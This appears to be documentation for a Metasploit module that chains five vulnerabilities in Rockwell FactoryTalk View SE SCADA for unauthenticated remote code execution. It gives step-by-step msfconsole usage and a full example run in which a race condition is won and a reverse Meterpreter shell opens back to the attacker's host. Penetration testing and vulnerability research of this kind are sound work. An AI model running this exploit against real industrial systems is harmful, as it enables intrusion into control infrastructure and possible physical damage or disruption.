## Vulnerable Application
This exploit requires Rockwell FactoryTalk View SE SCADA, which is only accessible to Rockwell customers.
The module exploits a series of vulnerabilities to achieve unauthenticated remote code execution on the product.
The default configuration is exploitable by an unauthenticated attacker, and successful exploitation results in RCE as the IIS user on the Windows server.
The attack relies on the chaining of five separate vulnerabilities. The first vulnerability is an unauthenticated project copy request, the second is a directory traversal, and the third is a race condition. In order to achieve full remote code execution on all targets, two information leak vulnerabilities are also abused.
This exploit was used by the Flashback team (Pedro Ribeiro + Radek Domanski) in Pwn2Own Miami 2020 to win the EWS category.
          
## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/scada/rockwell_factorytalk_rce`
3. Do: `set rhosts [RHOST]`
4. Do: `set lhost [LHOST]`
5. Do: `set srvhost [LHOST]`
6. Do: `run`
7. You should get a shell as the IIS user.

### Scenarios

This exploit was only tested on version 11.00.00.230. According to a Google search, it should work for all versions going back as far as 2008.

### Example run (Rockwell FactoryTalk View SE SCADA version 11.00.00.230 on Windows Server 2012 R2 x64)

```
msf6 > use exploit/windows/scada/rockwell
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/scada/rockwell) > set rhost 192.168.70.128
rhost => 192.168.70.128
msf6 exploit(windows/scada/rockwell) > set lhost 192.168.70.1
lhost => 192.168.70.1
msf6 exploit(windows/scada/rockwell) > set srvhost 192.168.70.1
srvhost => 192.168.70.1
msf6 exploit(windows/scada/rockwell) > check

[*] 192.168.70.128:80 - Detected version 11.00.00.230
[*] 192.168.70.128:80 - The target appears to be vulnerable.
msf6 exploit(windows/scada/rockwell) > run

[*] Started reverse TCP handler on 192.168.70.1:4444
[*] 192.168.70.128:80 - Listing projects on the server
[*] 192.168.70.128:80 - Received list of projects from the server
[*] 192.168.70.128:80 - Found project path: C:\Users\Public\Documents\RSView Enterprise\SE\HMI Projects\FTViewDemo_HMI
[+] 192.168.70.128:80 - Got a path to drop our shell: C:\Users\Public\Documents\RSView Enterprise\SE\HMI Projects\
[*] 192.168.70.128:80 - Starting up our web service on http://192.168.70.1:8080 ...
[*] Using URL: http://192.168.70.1:8080/RSViewSE/
[*] 192.168.70.128:80 - Starting racer thread, let's win this race condition!
[*] 192.168.70.128:80 - Initiating project copy request...
[+] 192.168.70.128:80 - Target connected, sending file path with dir traversal
[+] 192.168.70.128:80 - Target connected, sending payload
[+] 192.168.70.128:80 - We've won the race condition, shell incoming!
[*] Sending stage (175174 bytes) to 192.168.70.128
[*] Meterpreter session 1 opened (192.168.70.1:4444 -> 192.168.70.128:49894) at 2020-10-12 14:27:48 +0700
[*] Server stopped.

meterpreter > shell
Process 12008 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.449]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\SysWOW64\inetsrv>whoami
whoami
iis apppool\defaultapppool

C:\WINDOWS\SysWOW64\inetsrv>
```
